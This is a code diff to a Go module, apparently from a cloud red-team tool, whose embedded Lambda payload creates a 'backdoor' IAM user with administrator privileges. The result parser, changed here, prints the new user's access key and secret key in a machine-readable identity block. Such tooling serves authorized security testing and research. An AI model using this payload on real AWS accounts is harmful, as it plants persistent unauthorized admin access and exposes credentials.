@@ -1,3 +1,7 @@
+// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
+// This product includes software developed at Datadog (https://www.datadoghq.com/)
+// Copyright 2026 Datadog, Inc.
+
 package lambda
 
 import (
@@ -160,9 +164,6 @@ def lambda_handler(event, context):
             PolicyArn=admin_policy_arn
         )` + consoleCode + accessKeyCode + `
 
-        # Wait a moment for the user to be available
-        time.sleep(2)
-
         result['status'] = 'success'
         result['message'] = 'Backdoor user created successfully with administrator privileges'
 
@@ -231,17 +232,20 @@ func (p *BackdoorCreateUserPayload) ProcessResult(result string) (string, error)
 			}
 
 			if accessKeyID, ok := parsedBody["access_key_id"].(string); ok {
-				output.WriteString("Programmatic Access:\n")
-				output.WriteString("  AWS_ACCESS_KEY_ID=" + accessKeyID + "\n")
-
-				if secretKey, ok := parsedBody["secret_access_key"].(string); ok {
-					output.WriteString("  AWS_SECRET_ACCESS_KEY=" + secretKey + "\n")
+				secretKey, _ := parsedBody["secret_access_key"].(string)
+				userName, _ := parsedBody["user_name"].(string)
+				identityName := "backdoor/" + userName
+				if userName == "" {
+					identityName = "backdoor/lambda-user"
 				}
-				output.WriteString("\n")
+				output.WriteString("\n--- PATHFINDER_IDENTITY_DATA ---\n")
+				output.WriteString("NAME=" + identityName + "\n")
+				output.WriteString("TYPE=keys\n")
+				output.WriteString("ACCESS_KEY_ID=" + accessKeyID + "\n")
+				output.WriteString("SECRET_ACCESS_KEY=" + secretKey + "\n")
+				output.WriteString("AUTO_SWITCH=false\n")
+				output.WriteString("--- END_PATHFINDER_IDENTITY_DATA ---\n")
 			}
-
-			output.WriteString("The user has AdministratorAccess policy attached.\n")
-			output.WriteString("⚠ Store these credentials securely!\n")
 
 		} else {
 			output.WriteString("✗ Failed to create backdoor user\n")
